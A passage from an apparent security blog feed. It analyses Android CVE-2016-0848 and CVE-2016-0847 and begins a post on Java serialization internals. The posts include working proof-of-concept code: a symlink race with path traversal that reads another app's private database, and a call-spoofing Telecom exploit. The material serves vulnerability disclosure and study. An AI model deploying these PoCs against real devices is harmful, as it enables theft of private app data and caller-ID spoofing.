            return ParcelFileDescriptor.open(file, pfdMode, mHandler, new OnCloseListener() {
                @Override
                public void onClose(IOException e) {
                    final ContentValues values = new ContentValues();
                    values.put(Downloads.Impl.COLUMN_TOTAL_BYTES, file.length());
                    values.put(Downloads.Impl.COLUMN_LAST_MODIFICATION,
                            System.currentTimeMillis());
                    update(uri, values, null, null);

                    if (shouldScan) {
                        final Intent intent = new Intent(
                                Intent.ACTION_MEDIA_SCANNER_SCAN_FILE);
                        intent.setData(Uri.fromFile(file));
                        getContext().sendBroadcast(intent);
                    }
                }
            });
        } catch (IOException e) {
            throw new FileNotFoundException(&amp;quot;Failed to open for writing: &amp;quot; + e);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To open the downloaded file, do like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ContentResolver resolver = getContentResolver();
Uri uri = Uri.parse(&amp;quot;content://downloads/download&amp;quot;);
uri = ContentUris.withAppendedId(uri, 9);
InputStream in = resolver.openInputStream(uri);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;to-be-continued:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;To be Continued&amp;hellip;&lt;/h2&gt;

&lt;p&gt;In fact I still don&amp;rsquo;t know how to leverage this vulnerability&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;new-hint:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;New Hint!&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&#34;https://cve.circl.lu/cve/CVE-2016-0848&#34;&gt;cve.circl.lu&lt;/a&gt;&amp;rsquo;s description, we can find this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Race condition in Download Manager in Android 4.x before 4.4.4, 5.0.x before 5.0.2, 5.1.x before 5.1.1, and 6.x before 2016-04-01 allows attackers to bypass private-storage file-access restrictions via a crafted application that changes a symlink target.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there are two points: race condition and changing symlink target.&lt;/p&gt;

&lt;p&gt;I also mailed to Tongxin Li, one of the members who found this vulnerability, and he gave me more details about this vulnerability.&lt;/p&gt;

&lt;h2 id=&#34;poc:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;The POC leverages the vulnerability as the following steps:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Create a symlink whose target is a valid download destination.&lt;/li&gt;
&lt;li&gt;Init a download &lt;code&gt;Request&lt;/code&gt;, set the symlink as the destination, set only with wifi can the downloading process starts.&lt;/li&gt;
&lt;li&gt;Turn off wifi start download using the &lt;code&gt;Request&lt;/code&gt; we init above.&lt;/li&gt;
&lt;li&gt;Change the target of the symlink.&lt;/li&gt;
&lt;li&gt;Turn on the wifi.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Assume the package name of our POC app is a.b.c, we create a symlink in &lt;code&gt;/data/data/a.b.c/mylink&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;link_path = new File(getFilesDir().getCanonicalPath() + &amp;quot;/../&amp;quot;).getCanonicalPath() + &amp;quot;/mylink&amp;quot;;
Runtime runtime = Runtime.getRuntime();
Process process1 = runtime.exec(&amp;quot;rm &amp;quot; + link_path);
Process process = runtime.exec(&amp;quot;ln -s /mnt/sdcard/1.mp3 &amp;quot; + link_path);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we init the download &lt;code&gt;Request&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;DownloadManager.Request request = new DownloadManager.Request(Uri.parse(&amp;quot;http://www.ikoumi.com/yunpan/cL3XZ2A8Mha9X/785d.mp3&amp;quot;));
uri = Uri.parse(&amp;quot;file:///storage/sdcard0/../../data/data/a.b.c/mylink&amp;quot;);
request.setDestinationUri(uri);
request.setAllowedNetworkTypes(DownloadManager.Request.NETWORK_WIFI);
long id = downloadManager.enqueue(request);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because the device on which we do our test runs Android 4.1, whose DownloadProvider verifies the download destination uri by this way:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;switch(destination) {

...

case 4: {
    if(path.startsWith(this.mExternalStorageDir.getPath())) {
    v0 = this.mExternalStorageDir;
    goto label_24;
}

...

label_24:
    if(v0 == null) {
        throw new IllegalStateException(&amp;quot;invalid combination of destination: &amp;quot; + destination + &amp;quot;, path: &amp;quot; + path);
    }
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we construct the uri with a weird form &lt;code&gt;file:///storage/sdcard0/../../data/data/a.b.c/mylink&lt;/code&gt; to bypass this check.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Racing condition in Write&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Install the POC into a android device, firstly turn off wifi, start our POC app, create a symlink and start download, the process will pause, waiting wifi. Then the app changes the symlink, let it point to a path where  &lt;code&gt;com.android.providers.downloads&lt;/code&gt; has permission to write, like &lt;code&gt;/data/data/com.android.providers.media/myfile&lt;/code&gt;. Then we turn on the wifi, the download process continues and the file will be downloaded into &lt;code&gt;com.android.providers.media&lt;/code&gt;&amp;rsquo;s private data path.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Racing condition in Read&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this condition, racing condition in DownloadManager will lead to a privilege escalation of reading files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2016-0848/racing_read.png&#34; alt=&#34;racing_read&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Start two thread, one continuously read downloaded file by &lt;code&gt;openDownloadedFile(long id)&lt;/code&gt;. the other thread continuously changing the target of symlink between one valid downloaded path and one invalid private file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;new Thread() {
    @Override
    public void run() {
        while (true) {
            if (flag)
                break;
            try {
                ParcelFileDescriptor pfd = MainActivity.downloadManager.openDownloadedFile(id);
                Log.e(&amp;quot;msg&amp;quot;, &amp;quot;open success&amp;quot;);
                long size = pfd.getStatSize();
                // The valid file we have downloaded has a size 13502084
                // So, skip the opened file if we found it has this size
                if (size != 13502084) {
                    Log.e(&amp;quot;FD&amp;quot;, &amp;quot;size=&amp;quot; + size);
                    long native_fd = pfd.getFd();
                    Log.e(&amp;quot;FD&amp;quot;, pfd.toString());
                    Log.e(&amp;quot;FD&amp;quot;, &amp;quot;fd=&amp;quot; + native_fd);
                    flag = true;
                    break;
                }
            } catch (FileNotFoundException e) {
                Log.e(&amp;quot;error&amp;quot;, e.getMessage());
                continue;
            }
        }
    }
}.start();

new Thread() {
    @Override
    public void run() {
        Runtime runtime = Runtime.getRuntime();
        while (true) {
            try {
                runtime.exec(&amp;quot;rm &amp;quot; + link_path);
                runtime.exec(&amp;quot;ln -s /storage/sdcard0/../../data/data/com.android.providers.media/databases/external.db &amp;quot; + link_path);
                Thread.sleep(10);
                runtime.exec(&amp;quot;rm &amp;quot; + link_path);
                runtime.exec(&amp;quot;ln -s /mnt/sdcard/1.mp3 &amp;quot; + link_path);
                if (flag)
                    break;
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}.start();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logcat&amp;rsquo;s output, which proves that we has opened &lt;code&gt;/data/data/com.android.providers.media/databases/external.db&lt;/code&gt; successfully:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;E/error: Permission denied
E/error: Permission denied
E/error: Permission denied
E/error: No such file or directory
E/error: No such file or directory
E/error: No such file or directory
E/error: No such file or directory
E/msg: open success
E/msg: open success
E/msg: open success
E/error: No such file or directory
E/error: No such file or directory
E/error: No such file or directory
E/error: No such file or directory
E/error: No such file or directory
E/FD: size=606208
E/FD: {ParcelFileDescriptor: FileDescriptor[845]}
E/FD: fd=845
E/msg: open success
E/FD: size=606208
E/FD: {ParcelFileDescriptor: FileDescriptor[836]}
E/FD: fd=836
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;source-code-path:5459385d9d0b6f9dc023b7f545e11455&#34;&gt;Source Code Path&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;DownloadProvider: packages/Providers/DownloadProvider/Src/Com/Android/Providers/Downloads/DownloadProvider.java&lt;/li&gt;
&lt;li&gt;DownloadManager: frameworks/base/core/java/android/app/DownloadManager.java&lt;/li&gt;
&lt;li&gt;SystemServiceRegistry: frameworks/base/core/java/android/app/SystemServiceRegistry.java&lt;/li&gt;
&lt;li&gt;ContextImpl: frameworks/base/core/java/android/app/ContextImpl.java&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2016-0847</title>
      <link>https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/</link>
      <pubDate>Fri, 08 Apr 2016 15:55:52 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/04/08/analysis-of-cve-2016-0847/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In &lt;a href=&#34;https://source.android.com/security/bulletin/2016-04-02.html&#34;&gt;Nexus Security Bulletin-April 2016&lt;/a&gt;, cve-2016-0847 is disclosed. Let&amp;rsquo;s analysis!&lt;/p&gt;

&lt;h2 id=&#34;overview-of-telecom&#34;&gt;Overview of Telecom&lt;/h2&gt;

&lt;p&gt;When a phone call arrives, android framework will send a notification to &lt;code&gt;Telephony&lt;/code&gt;. The latter will call function addNewIncomingCall() like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This somehow equals:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);
    telecomManager.addNewIncomingCall(phoneAccount, extras);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;TelecomManager&lt;/code&gt; can be get by &lt;code&gt;context.getSystemService(context.TELECOM_SERVICE)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we should find where telecom service is registered.&lt;/p&gt;

&lt;p&gt;Android has a system service named &lt;code&gt;TelecomLoaderService&lt;/code&gt; whose function &lt;code&gt;onBootPhase&lt;/code&gt; is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
public void onBootPhase(int phase) {
    if (phase == PHASE_ACTIVITY_MANAGER_READY) {
        registerDefaultAppNotifier();
        registerCarrierConfigChangedReceiver();
        connectToTelecom();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;onBootPhase()&lt;/code&gt; is called during booting, it calls another function &lt;code&gt;connectToTelecom()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private static final ComponentName SERVICE_COMPONENT = new ComponentName(
            &amp;quot;com.android.server.telecom&amp;quot;,
            &amp;quot;com.android.server.telecom.components.TelecomService&amp;quot;);

private void connectToTelecom() {
    synchronized (mLock) {
        if (mServiceConnection != null) {
            // TODO: Is unbinding worth doing or wait for system to rebind?
            mContext.unbindService(mServiceConnection);
            mServiceConnection = null;
        }

        TelecomServiceConnection serviceConnection = new TelecomServiceConnect();
        Intent intent = new Intent(SERVICE_ACTION);
        intent.setComponent(SERVICE_COMPONENT);
        int flags = Context.BIND_IMPORTANT | Context.BIND_FOREGROUND_SERVICE
                | Context.BIND_AUTO_CREATE;

        // Bind to Telecom and register the service
        if (mContext.bindServiceAsUser(intent, serviceConnection, flags, UserHandle.OWNER)) {
            mServiceConnection = serviceConnection;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Function &lt;code&gt;connectToTelecom&lt;/code&gt; binds a serivce named &lt;code&gt;com.android.server.telecom.components.TelecomService&lt;/code&gt;, the ServiceConnection is &lt;code&gt;TelecomServiceConnection&lt;/code&gt; whose &lt;code&gt;onServiceConnected()&lt;/code&gt; is implemented as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private class TelecomServiceConnection implements ServiceConnection {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // Normally, we would listen for death here, but since telecom runs in the same process
        // as this loader (process=&amp;quot;system&amp;quot;) thats redundant here.
        try {
            service.linkToDeath(new IBinder.DeathRecipient() {
                @Override
                public void binderDied() {
                    connectToTelecom();
                }
            }, 0);
            SmsApplication.getDefaultMmsApplication(mContext, false);
            ServiceManager.addService(Context.TELECOM_SERVICE, service);
    ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, when the phone is booting, &lt;code&gt;TelecomLoaderService.onBootPhase()&lt;/code&gt; is invoked, it calls function &lt;code&gt;connectToTelecom()&lt;/code&gt;. This function binds the service &lt;code&gt;com.android.server.telecom.components.TelecomService&lt;/code&gt;. &lt;code&gt;TelecomService.onBind()&lt;/code&gt; will return a &lt;code&gt;IBinder&lt;/code&gt; object which is the second parameter of &lt;code&gt;onServiceConnected(ComponentName name, IBinder service)&lt;/code&gt;. Function &lt;code&gt;onServiceConnected()&lt;/code&gt; registers this binder into &lt;code&gt;ServiceManager&lt;/code&gt; as the &lt;code&gt;TELECOM_SERVICE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here is the &lt;code&gt;onBind()&lt;/code&gt; of &lt;code&gt;TelecomService&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public IBinder onBind(Intent intent) {
    Log.d(this, &amp;quot;onBind&amp;quot;);
    initializeTelecomSystem(this);
    synchronized (getTelecomSystem().getLock()) {
        return getTelecomSystem().getTelecomServiceImpl().getBinder();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;getTelecomSystem().getTelecomServiceImpl()&lt;/code&gt; returns an object of TelecomServiceImpl. The &lt;code&gt;getBinder()&lt;/code&gt; in TelecomServiceImpl is like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ITelecomService.Stub getBinder() {
    return mBinderImpl;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;mBinderImpl&lt;/code&gt; is a field of TelecomServiceImpl:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private final ITelecomService.Stub mBinderImpl = new ITelecomService.Stub() {
	...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;mBinderImpl&lt;/code&gt; implements the interfaces defined in &lt;code&gt;ITelecomService.aidl&lt;/code&gt;, including &lt;code&gt;addNewIncomingCall()&lt;/code&gt; and &lt;code&gt;addNewUnknownCall()&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;start-from-the-patch&#34;&gt;Start from the Patch&lt;/h2&gt;

&lt;p&gt;From the &lt;a href=&#34;https://android.googlesource.com/platform/packages/services/Telecomm/+/2750faaa1ec819eed9acffea7bd3daf867fda444%5E%21/#F0&#34;&gt;patch&lt;/a&gt; we can see the fix is in &lt;code&gt;TelecomServiceImple.java&lt;/code&gt;:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Add a new function &lt;code&gt;enforcePhoneAccountIsRegisteredEnabled&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;After every &lt;code&gt;enforceUserHandleMatchesCaller(phoneAccountHandle)&lt;/code&gt;, add the newly added function.&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    // Enforce that the PhoneAccountHandle being passed in is both registered to the current user
+    // and enabled.
+    private void enforcePhoneAccountIsRegisteredEnabled(PhoneAccountHandle phoneAccountHandle) {
+        PhoneAccount phoneAccount = mPhoneAccountRegistrar.getPhoneAccountCheckCallingUser(
+                phoneAccountHandle);
+        if (phoneAccount == null) {
+            EventLog.writeEvent(0x534e4554, &amp;quot;26864502&amp;quot;, Binder.getCallingUid(), &amp;quot;R&amp;quot;);
+            throw new SecurityException(&amp;quot;This PhoneAccountHandle is not registered for this user!&amp;quot;);
+        }
+        if (!phoneAccount.isEnabled()) {
+            EventLog.writeEvent(0x534e4554, &amp;quot;26864502&amp;quot;, Binder.getCallingUid(), &amp;quot;E&amp;quot;);
+            throw new SecurityException(&amp;quot;This PhoneAccountHandle is not enabled for this user!&amp;quot;);
+        }
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s see &lt;code&gt;getPhoneAccountCheckCallingUser()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public PhoneAccount getPhoneAccountCheckCallingUser(PhoneAccountHandle handle) {
    PhoneAccount account = getPhoneAccount(handle);
    if (account != null &amp;amp;&amp;amp; isVisibleForUser(account)) {
        return account;
    }
    return null;
}
PhoneAccount getPhoneAccount(PhoneAccountHandle handle) {
    for (PhoneAccount m : mState.accounts) {
        if (Objects.equals(handle, m.getAccountHandle())) {
            return m;
        }
    }
    return null;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By invoking &lt;code&gt;TelecomManager.registerPhoneAccount()&lt;/code&gt;, one can register a &lt;code&gt;PhoneAccount&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In &lt;code&gt;TelecomServiceImpl.java&lt;/code&gt;, there are two fucntions in which  &lt;code&gt;enforceUserHandleMatchesCaller(phoneAccountHandle)&lt;/code&gt; is called. (&lt;font color=&#34;red&#34;&gt; note: All the code below are not patched &lt;/font&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt; @Override
public void addNewIncomingCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
    synchronized (mLock) {
        if (phoneAccountHandle != null &amp;amp;&amp;amp; phoneAccountHandle.getComponentName() != null) {
           // TODO(sail): Add unit tests for adding incoming calls from a SIM call manager.
            if (isCallerSimCallManager() &amp;amp;&amp;amp; TelephonyUtil.isPstnComponentName(
                    phoneAccountHandle.getComponentName())) {
                Log.v(this, &amp;quot;Allowing call manager to add incoming call with PSTN handle&amp;quot;);
            } else {
                mAppOpsManager.checkPackage(
                        Binder.getCallingUid(),
                        phoneAccountHandle.getComponentName().getPackageName());
                // Make sure it doesn&#39;t cross the UserHandle boundary
                enforceUserHandleMatchesCaller(phoneAccountHandle);
            }

            long token = Binder.clearCallingIdentity();
            try {
                Intent intent = new Intent(TelecomManager.ACTION_INCOMING_CALL);
                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    phoneAccountHandle);
                intent.putExtra(CallIntentProcessor.KEY_IS_INCOMING_CALL, true);
                if (extras != null) {
                    intent.putExtra(TelecomManager.EXTRA_INCOMING_CALL_EXTRAS, extras);
                }
                CallIntentProcessor.processIncomingCallIntent(mCallsManager, intent);
            } finally {
                Binder.restoreCallingIdentity(token);
            }
        } else {
            Log.w(this, &amp;quot;Null phoneAccountHandle. Ignoring request to add new incoming call&amp;quot;);
        }
    }
}


@Override
public void addNewUnknownCall(PhoneAccountHandle phoneAccountHandle, Bundle extras) {
    synchronized (mLock) {
        if (phoneAccountHandle != null &amp;amp;&amp;amp; phoneAccountHandle.getComponentName() != null) {
            mAppOpsManager.checkPackage(
                    Binder.getCallingUid(),
                    phoneAccountHandle.getComponentName().getPackageName());

            // Make sure it doesn&#39;t cross the UserHandle boundary
            enforceUserHandleMatchesCaller(phoneAccountHandle);
            long token = Binder.clearCallingIdentity();

            try {
                Intent intent = new Intent(TelecomManager.ACTION_NEW_UNKNOWN_CALL);
                intent.putExtras(extras);
                intent.putExtra(CallIntentProcessor.KEY_IS_UNKNOWN_CALL, true);
                intent.putExtra(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE,
                    phoneAccountHandle);
                CallIntentProcessor.processUnknownCallIntent(mCallsManager, intent);
            } finally {
                Binder.restoreCallingIdentity(token);
            }
        } else {
            Log.i(this,&amp;quot;Null phoneAccountHandle or not initiated by Telephony. &amp;quot; +
                            &amp;quot;Ignoring request to add new unknown call.&amp;quot;);
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By calling these functions, the attacker can leverage the vulnerability to make calls appear to come from any arbitrary number.&lt;/p&gt;

&lt;h2 id=&#34;phoneaccounthandle&#34;&gt;PhoneAccountHandle&lt;/h2&gt;

&lt;p&gt;Then, let&amp;rsquo;s see what is &lt;code&gt;PhoneAccountHandle&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://developer.android.com/reference/android/telecom/PhoneAccountHandle.html&#34;&gt;android.telecom.PhoneAccountHandle&lt;/a&gt; is the unique identifier for a &lt;a href=&#34;https://developer.android.com/reference/android/telecom/PhoneAccount.html&#34;&gt;PhoneAccount&lt;/a&gt;, which represents a distinct method to place or receive a phone call. &lt;a href=&#34;https://developer.android.com/reference/android/telecom/TelecomManager.html&#34;&gt;TelecomManager&lt;/a&gt; uses registered PhoneAccounts to present the user with alternative options when placing a phone call. When building a PhoneAccount, the app should supply a valid PhoneAccountHandle that references the connection service implementation Telecom will use to interact with the app.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final class PhoneAccountHandle implements Parcelable {
    private final ComponentName mComponentName;
    private final String mId;
    private final UserHandle mUserHandle;

    public PhoneAccountHandle(
            ComponentName componentName,
            String id) {
        this(componentName, id, Process.myUserHandle());
    }

    public PhoneAccountHandle(
            ComponentName componentName,
            String id,
            UserHandle userHandle) {
        mComponentName = componentName;
        mId = id;
        mUserHandle = userHandle;
    }

    ...

}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;AOSP provide us an example how to &amp;laquo;make a phone call&amp;raquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
            new ComponentName(context, TestConnectionService.class),
            CallServiceNotifier.SIM_SUBSCRIPTION_ID);
    Bundle extras = new Bundle();
    extras.putBoolean(TestConnectionService.EXTRA_IS_VIDEO_CALL, isVideoCall);
    if (handle != null) {
        extras.putParcelable(TestConnectionService.EXTRA_HANDLE, handle);
    }
    TelecomManager.from(context).addNewIncomingCall(phoneAccount, extras);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Below is our POC:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;MainActivity.java&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public void sendIncomingCallIntent(Context context, Uri handle, boolean isVideoCall) {
    PhoneAccountHandle phoneAccount = new PhoneAccountHandle(
                new ComponentName(this.getApplicationContext(), MyService.class),
                &amp;quot;test&amp;quot;);

    TelecomManager telecomManager = (TelecomManager) context.getSystemService(context.TELECOM_SERVICE);

    // register phone account
    PhoneAccount account = PhoneAccount.builder(phoneAccount, &amp;quot;test&amp;quot;).build();
    telecomManager.registerPhoneAccount(account);

    PhoneAccountHandle thehandle = account.getAccountHandle();

    Bundle extras = new Bundle();
    extras.putBoolean(&amp;quot;extra_is_video_call&amp;quot;, isVideoCall);
    Uri uri = Uri.fromParts(PhoneAccount.SCHEME_TEL, &amp;quot;1234567&amp;quot;, null);
    extras.putParcelable(TelecomManager.EXTRA_INCOMING_CALL_ADDRESS, uri);
    if (handle != null) {
        extras.putParcelable(&amp;quot;extra_handle&amp;quot;, handle);
    }
    telecomManager.addNewIncomingCall(thehandle, extras);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;MyService.java&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Connection onCreateIncomingConnection(PhoneAccountHandle connectionManagerPhoneAccount, ConnectionRequest request) {
    Log.e(TAG, &amp;quot;onCreateIncomingConnection&amp;quot;);
    Connection connection = createConnectionFor();
    return connection;
}

private Connection createConnectionFor() {
    Connection returnConnection = new Connection() {

    };
    return returnConnection;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;AndroidManifest.xml&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;service
    android:name=&amp;quot;.MyService&amp;quot;
    android:enabled=&amp;quot;true&amp;quot;
    android:exported=&amp;quot;true&amp;quot;
    android:permission=&amp;quot;android.permission.BIND_TELECOM_CONNECTION_SERVICE&amp;quot;&amp;gt;
    &amp;lt;intent-filter&amp;gt;
        &amp;lt;action android:name=&amp;quot;android.telecom.ConnectionService&amp;quot; /&amp;gt;
    &amp;lt;/intent-filter&amp;gt;
&amp;lt;/service&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;source-code-path&#34;&gt;Source Code Path&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;TelecomService: packages/services/Telecomm/src/com/android/server/telecom/components/TelecomService.java&lt;/li&gt;
&lt;li&gt;TelecomLoaderService: frameworks/base/services/core/java/com/android/server/telecom/TelecomLoaderService.java&lt;/li&gt;
&lt;li&gt;TelecomServiceImpl: packages/services/Telecomm/src/com/android/server/telecom/TelecomServiceImpl.java&lt;/li&gt;
&lt;li&gt;TelecomSystem: packages/services/Telecomm/src/com/android/server/telecom/TelecomSystem.java&lt;/li&gt;
&lt;li&gt;ITelecomService.aidl: frameworks/base/services/core/java/com/android/internal/telecom/ITelecomService.aidl&lt;/li&gt;
&lt;li&gt;PhoneAccountHandle: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccountHandle.java&lt;/li&gt;
&lt;li&gt;PhoneAccountRegistrar: packages/services/Telecomm/src/com/android/server/telecom/PhoneAccountRegistrar.java&lt;/li&gt;
&lt;li&gt;PhoneAccount: frameworks/base/Telecomm/Java/Android/Telecom/PhoneAccount.java&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of Java Serialization</title>
      <link>https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/</link>
      <pubDate>Tue, 15 Mar 2016 10:28:28 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/15/analysis-of-java-serialization/</guid>
      <description>

&lt;h3 id=&#34;demo:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Demo&lt;/h3&gt;

&lt;p&gt;Class &lt;code&gt;MySerial&lt;/code&gt; contains these fields and methods.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class MySerial implements Serializable{
	private static final long serialVersionUID = -7524021481133441646L;
	private int mArg = 1;
	private int mOrg = 2;
	
	public String toString() {
		return &amp;quot;mArg:&amp;quot; + mArg + &amp;quot; mOrg:&amp;quot; + mOrg;
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In main function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] argv) {
	MySerial mySerial = new MySerial();
	try {
		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&amp;quot;obj.bin&amp;quot;));
		oos.writeObject(mySerial);     // Set a break point here.
		oos.flush();
		oos.close();
	
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&amp;quot;obj.bin&amp;quot;));
		Object obj = ois.readObject(); // Set a break point here.
		System.out.println(obj.getClass().getName());
	} catch (Exception e) {
		...
	}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;debugging-objectinputstream-readobject:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Debugging ObjectInputStream.readObject()&lt;/h3&gt;

&lt;p&gt;The constructor of &lt;code&gt;ObjectInputStream&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public ObjectInputStream(InputStream in) throws IOException {
    verifySubclass();
    bin = new BlockDataInputStream(in);
    handles = new HandleTable(10);
    vlist = new ValidationList();
    enableOverride = false;
    readStreamHeader();
    bin.setBlockDataMode(true);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void readStreamHeader() throws IOException, StreamCorruptedException
{
    short s0 = bin.readShort();
    short s1 = bin.readShort();
    // STREAM_MAGIC=-21267, STREAM_VERSION=5
    if (s0 != STREAM_MAGIC || s1 != STREAM_VERSION) {
        throw new StreamCorruptedException(
            String.format(&amp;quot;invalid stream header: %04X%04X&amp;quot;, s0, s1));
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/magic_and_version.png&#34; alt=&#34;magic and version&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into function &lt;code&gt;ois.readObject&lt;/code&gt;, see how an object is created during deserialization.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final Object readObject() throws IOException, ClassNotFoundException
{
    if (enableOverride) {
        return readObjectOverride();
    }

    // if nested read, passHandle contains handle of enclosing object
    int outerHandle = passHandle;
    try {
        Object obj = readObject0(false);  // Step into this function
        handles.markDependency(outerHandle, passHandle);
        ClassNotFoundException ex = handles.lookupException(passHandle);
        if (ex != null) {
            throw ex;
        }
        if (depth == 0) {
